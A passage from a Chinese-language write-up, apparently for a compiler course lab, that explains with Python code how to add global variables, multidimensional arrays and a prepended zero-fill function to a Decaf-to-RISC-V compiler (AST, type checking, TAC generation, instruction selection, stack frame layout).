class="language-python"><span class="token comment"># utils/tac/tacinstr.py</span><span class="token keyword">class</span> <span class="token class-name">LoadAddress</span><span class="token punctuation">(</span>TACInstr<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># LOAD SYMBOL ADDRESS...</span><span class="token keyword">class</span> <span class="token class-name">LoadIntLiteral</span><span class="token punctuation">(</span>TACInstr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># LOAD SYMBOL...</span><span class="token keyword">class</span> <span class="token class-name">StoreIntLiteral</span><span class="token punctuation">(</span>TACInstr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># STORE SYMBOL...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>utils/tac/tacgen.py</code> 中 <code>TACFuncEmitter</code> 类实现与之有关的 <code>Visitor</code> 模式方法, 修改 <code>TACGen</code> 类的 <code>visitAssignment</code> 及 <code>visitIdentifier</code> 方法, 判断访问标识符和赋值操作是否对<strong>全局变量</strong>进行:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/tac/tacgen.py</span><span class="token keyword">class</span> <span class="token class-name">TACGen</span><span class="token punctuation">(</span>Visitor<span class="token punctuation">[</span>TACFuncEmitter<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">visitIdentifier</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ident<span class="token punctuation">:</span> Identifier<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment">#! 标识符是全局变量</span>        <span class="token keyword">if</span> ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"symbol"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isGlobal<span class="token punctuation">:</span>            ident<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'val'</span><span class="token punctuation">,</span> mv<span class="token punctuation">.</span>visitLoadIntLiteral<span class="token punctuation">(</span>ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#! 否则</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            ident<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'val'</span><span class="token punctuation">,</span> ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>temp<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visitAssignment</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> Assignment<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        expr<span class="token punctuation">.</span>rhs<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>        <span class="token comment">#! 左值是全局变量</span>        <span class="token keyword">if</span> expr<span class="token punctuation">.</span>lhs<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isGlobal<span class="token punctuation">:</span>            mv<span class="token punctuation">.</span>visitStoreIntLiteral<span class="token punctuation">(</span>expr<span class="token punctuation">.</span>lhs<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> expr<span class="token punctuation">.</span>rhs<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#! 否则</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            expr<span class="token punctuation">.</span>lhs<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>            expr<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span>                <span class="token string">"val"</span><span class="token punctuation">,</span> mv<span class="token punctuation">.</span>visitAssignment<span class="token punctuation">(</span>expr<span class="token punctuation">.</span>lhs<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"symbol"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>temp<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>rhs<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>目标代码生成</strong>: 在 <code>utils/riscv.py</code> 中参照已有实现, 添加<strong>全局变量</strong>地址获取、加载和存储的 RISC-V 指令:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/riscv.py</span><span class="token keyword">class</span> <span class="token class-name">LoadAddress</span><span class="token punctuation">(</span>TACInstr<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># LOAD SYMBOL ADDRESS...</span><span class="token keyword">class</span> <span class="token class-name">LoadIntLiteral</span><span class="token punctuation">(</span>TACInstr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># LOAD SYMBOL...</span><span class="token keyword">class</span> <span class="token class-name">StoreIntLiteral</span><span class="token punctuation">(</span>TACInstr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># STORE SYMBOL...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>backend/riscv/riscvasmemitter.py</code> 中, <code>RiscvAsmEmitter</code> 对象初始化时打印全局变量至 <code>.data</code> 区, 并为 <code>RiscvInstrSelector</code> 实现相应全局变量指令访问方法:</p><h3 id="step-11"><a href="#step-11" class="headerlink" title="step 11"></a>step 11</h3><p><strong>词法语法分析</strong>: 修改 <code>frontend/ast/tree.py</code>, 通过 <code>Program</code> 的 <code>globalVars()</code> 方法返回<strong>全局变量</strong>与<strong>全局数组</strong>键值对; 修改 <code>Declaration</code> 节点定义, 添加数组维度声明 <code>init_dim</code>; 同时添加索引运算节点 <code>IndexExpr</code>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/ast/tree.py</span><span class="token keyword">class</span> <span class="token class-name">IndexExpr</span><span class="token punctuation">(</span>Expression<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> base<span class="token punctuation">:</span> Expression<span class="token punctuation">,</span> index<span class="token punctuation">:</span> Expression<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"index_expr"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>base <span class="token operator">=</span> base        self<span class="token punctuation">.</span>index <span class="token operator">=</span> index<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>frontend/parser/ply_parser.py</code> 中参考已有实现, 给出相关 <code>CFG</code> 文法.</p><p><strong>语义分析</strong>: 修改 <code>frontend/typecheck/namer.py</code>, <code>visitFunction</code> 中记录当前函数声明的<strong>局部数组</strong>; 在 <code>visitDeclaration</code> 中依据标识符类型进行初始化, 如果是数组则调用 <code>ArrayType.multidim</code>; 添加 <code>visitIndexExpr</code> 中递归实现数组索引访问.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/typecheck/namer.py</span><span class="token keyword">def</span> <span class="token function">visitDeclaration</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> decl<span class="token punctuation">:</span> Declaration<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span> decl<span class="token punctuation">.</span>init_dim<span class="token punctuation">:</span>        decl_type <span class="token operator">=</span> ArrayType<span class="token punctuation">.</span>multidim<span class="token punctuation">(</span>decl<span class="token punctuation">.</span>var_t<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">[</span>dim<span class="token punctuation">.</span>value <span class="token keyword">for</span> dim <span class="token keyword">in</span> decl<span class="token punctuation">.</span>init_dim<span class="token punctuation">]</span><span class="token punctuation">)</span>        symbol <span class="token operator">=</span> VarSymbol<span class="token punctuation">(</span>decl<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">,</span> decl_type<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>arrays<span class="token punctuation">.</span>append<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        decl_type <span class="token operator">=</span> decl<span class="token punctuation">.</span>var_t<span class="token punctuation">.</span><span class="token builtin">type</span>        symbol <span class="token operator">=</span> VarSymbol<span class="token punctuation">(</span>decl<span class="token punctuation">.</span>ident<span class="token punctuation">.</span>value<span class="token punctuation">,</span> decl_type<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">def</span> <span class="token function">visitIndexExpr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> IndexExpr<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> ScopeStack<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expr<span class="token punctuation">.</span>base<span class="token punctuation">,</span> Identifier<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> ctx<span class="token punctuation">.</span>lookupOverStack<span class="token punctuation">(</span>expr<span class="token punctuation">.</span>base<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> DecafUndefinedVarError<span class="token punctuation">(</span>expr<span class="token punctuation">.</span>base<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    expr<span class="token punctuation">.</span>base<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    expr<span class="token punctuation">.</span>index<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span>    <span class="token comment">#! 根据 base 类型设置 expr 的类型</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expr<span class="token punctuation">.</span>base<span class="token punctuation">,</span> Identifier<span class="token punctuation">)</span><span class="token punctuation">:</span>        expr<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">,</span> expr<span class="token punctuation">.</span>base<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">.</span>indexed<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        expr<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">,</span> expr<span class="token punctuation">.</span>base<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>indexed<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过对节点的 <code>setattr('type')</code> 与 <code>getattr('type')</code> 操作实现类型运算一致性检查, 一共有 <code>INT</code> 与 <code>ArrayType</code> 两种类型, 如果相应运算类型不一致, 则会抛出异常 <code>DecafBadReturnTypeError</code>.</p><p><strong>中间代码生成</strong>: 在 <code>utils/tac/tacgen.py</code> 中 <code>TACFuncEmitter</code> 类实现了依地址的读写数组元素的方法:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># frontend/tacgen/tacgen.py</span><span class="token keyword">class</span> <span class="token class-name">TACFuncEmitter</span><span class="token punctuation">(</span>TACVisitor<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">visitLoadByAddress</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> addr<span class="token punctuation">:</span> Temp<span class="token punctuation">)</span><span class="token punctuation">:</span>        dst <span class="token operator">=</span> self<span class="token punctuation">.</span>freshTemp<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>func<span class="token punctuation">.</span>add<span class="token punctuation">(</span>LoadIntLiteral<span class="token punctuation">(</span>dst<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dst    <span class="token keyword">def</span> <span class="token function">visitStoreByAddress</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">:</span> Temp<span class="token punctuation">,</span> addr<span class="token punctuation">:</span> Temp<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>func<span class="token punctuation">.</span>add<span class="token punctuation">(</span>StoreIntLiteral<span class="token punctuation">(</span>value<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改 <code>TACGen</code> 类的 <code>visitIndexExpr</code>, <code>visitAssignment</code> 及 <code>visitIdentifier</code> 方法, 设置数组索引表达式的地址, 并判断访问标识符和赋值操作是否对数组进行:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/tac/tacgen.py</span><span class="token keyword">class</span> <span class="token class-name">TACGen</span><span class="token punctuation">(</span>Visitor<span class="token punctuation">[</span>TACFuncEmitter<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">visitIdentifier</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ident<span class="token punctuation">:</span> Identifier<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token comment"># 数组类型 -&gt; 设置数组地址</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">,</span> ArrayType<span class="token punctuation">)</span><span class="token punctuation">:</span>            ident<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'addr'</span><span class="token punctuation">,</span> mv<span class="token punctuation">.</span>visitLoadAddress<span class="token punctuation">(</span>ident<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'symbol'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">def</span> <span class="token function">visitIndexExpr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> IndexExpr<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        expr<span class="token punctuation">.</span>base<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'slice'</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>        expr<span class="token punctuation">.</span>base<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>        expr<span class="token punctuation">.</span>index<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>        <span class="token comment">#! 递归计算当前索引的偏移量</span>        addr <span class="token operator">=</span> mv<span class="token punctuation">.</span>visitLoad<span class="token punctuation">(</span>expr<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span>        mv<span class="token punctuation">.</span>visitBinarySelf<span class="token punctuation">(</span>tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>MUL<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>index<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'val'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        mv<span class="token punctuation">.</span>visitBinarySelf<span class="token punctuation">(</span>tacop<span class="token punctuation">.</span>TacBinaryOp<span class="token punctuation">.</span>ADD<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>base<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'addr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        expr<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'addr'</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span>        <span class="token comment">#! 递归完毕, 通过地址获得数组元素值</span>        <span class="token comment">#! `slice` 属性表示为数组切片, 无需获取数据</span>        <span class="token comment">#! 保证递归结束只有完整的索引表达式设置了返回值</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> expr<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'slice'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            expr<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'val'</span><span class="token punctuation">,</span> mv<span class="token punctuation">.</span>visitLoadByAddress<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visitAssignment</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> expr<span class="token punctuation">:</span> Assignment<span class="token punctuation">,</span> mv<span class="token punctuation">:</span> TACFuncEmitter<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment"># 索引类型 -&gt; 访问数组地址</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expr<span class="token punctuation">.</span>lhs<span class="token punctuation">,</span> IndexExpr<span class="token punctuation">)</span><span class="token punctuation">:</span>            expr<span class="token punctuation">.</span>lhs<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'slice'</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>            expr<span class="token punctuation">.</span>lhs<span class="token punctuation">.</span>accept<span class="token punctuation">(</span>self<span class="token punctuation">,</span> mv<span class="token punctuation">)</span>            mv<span class="token punctuation">.</span>visitStoreByAddress<span class="token punctuation">(</span>expr<span class="token punctuation">.</span>rhs<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'val'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> expr<span class="token punctuation">.</span>lhs<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">'addr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            expr<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span><span class="token string">'val'</span><span class="token punctuation">,</span> expr<span class="token punctuation">.</span>rhs<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>目标代码生成</strong>: 在 <code>utils/riscv.py</code> 中实现了 <code>addi</code> 的 RISC-V 指令, 用于加载通过 <code>TACFunc.arrays</code> 传递并保存在栈的<strong>局部数组</strong> (仍通过 <code>Program.globalVars</code> 加载<strong>全局数组</strong>地址):</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># utils/riscv.py</span><span class="token keyword">class</span> <span class="token class-name">ImmAdd</span><span class="token punctuation">(</span>TACInstr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> dst<span class="token punctuation">:</span> Temp<span class="token punctuation">,</span> src<span class="token punctuation">:</span> Temp<span class="token punctuation">,</span> value<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>InstrKind<span class="token punctuation">.</span>SEQ<span class="token punctuation">,</span> <span class="token punctuation">[</span>dst<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>src<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>value <span class="token operator">=</span> value    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token operator">-</span><span class="token number">2048</span> <span class="token operator">&lt;=</span> self<span class="token punctuation">.</span>value <span class="token operator">&lt;=</span> <span class="token number">2047</span>  <span class="token comment"># Riscv imm [11:0]</span>        <span class="token keyword">return</span> <span class="token string">"addi "</span> <span class="token operator">+</span> Riscv<span class="token punctuation">.</span>FMT3<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>dsts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>srcs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">)</span>        <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入一个函数前, 提前将其中的<strong>局部数组压栈</strong>, 在 <code>backend/subroutineinfo.py</code> 中计算得到各数组偏移量及占用栈帧大小:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/subroutineinfo.py</span><span class="token keyword">class</span> <span class="token class-name">SubroutineInfo</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> funcLabel<span class="token punctuation">:</span> FuncLabel<span class="token punctuation">,</span> numArgs<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> arrays<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> VarSymbol<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>offsets<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        self<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> name<span class="token punctuation">,</span> symbol <span class="token keyword">in</span> self<span class="token punctuation">.</span>arrays<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>offsets<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>size            self<span class="token punctuation">.</span>size <span class="token operator">+=</span> symbol<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">.</span>size<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>backend/riscv/riscvasmemitter.py</code> 中, <code>RiscvAsmEmitter</code> 对象初始化时打印<strong>全局数组</strong>至 <code>.bss</code> 区, <code>RiscvInstrSelector</code> 中通过偏移量实现<strong>局部数组</strong>访问:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># backend/riscv/riscvasmemitter.py</span><span class="token keyword">class</span> <span class="token class-name">RiscvAsmEmitter</span><span class="token punctuation">(</span>AsmEmitter<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">class</span> <span class="token class-name">RiscvInstrSelector</span><span class="token punctuation">(</span>TACVisitor<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">visitLoadAddress</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> instr<span class="token punctuation">:</span> LoadAddress<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> instr<span class="token punctuation">.</span>symbol<span class="token punctuation">.</span>isGlobal<span class="token punctuation">:</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>seq<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Riscv<span class="token punctuation">.</span>ImmAdd<span class="token punctuation">(</span>instr<span class="token punctuation">.</span>dsts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Riscv<span class="token punctuation">.</span>SP<span class="token punctuation">,</span> self<span class="token punctuation">.</span>info<span class="token punctuation">.</span>offsets<span class="token punctuation">[</span>instr<span class="token punctuation">.</span>symbol<span class="token punctuation">.</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时的 <code>self.nextLocalOffset</code> 及保存 <code>RA</code>, <code>FP</code> 和 <code>Callee-saved</code> 寄存器时需要额外加上 <code>self.info.size</code> 由<strong>局部数组</strong>占用的栈帧大小.</p><h3 id="step-12"><a href="#step-12" class="headerlink" title="step 12"></a>step 12</h3><p><strong>代码流读入</strong>: 在 <code>main.py</code> 中给出 <code>memset</code> 函数 <code>fill_csx</code> 的<strong>字符串表示</strong>, 命名方式是为了防止可能的函数重名 (虽然根据给出的测例, 没有名为 <code>fill_csx</code> 的函数, 但更好的方法是在语法分析后动态命名). 随后直接将代码加入输入的 <code>code</code> 前:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># main.py</span>memsetFunc <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""int fill_csx(int array[], int cnt) {    for (int i = 0; i &lt; cnt; i = i + 1) {        array[i] = 0;    }    return 0;}"""</span><span class="token keyword">def</span> <span class="token function">step_parse</span><span class="token punctuation">(</span>args<span class="token punctuation">:</span> argparse<span class="token punctuation">.</span>Namespace<span class="token punctuation">)</span><span class="token punctuation">:</span>    code <span class="token operator">=</span> memsetFunc <span class="token operator">+</span> <span class="token string">"\n"</span> <span class="token operator">+</span> 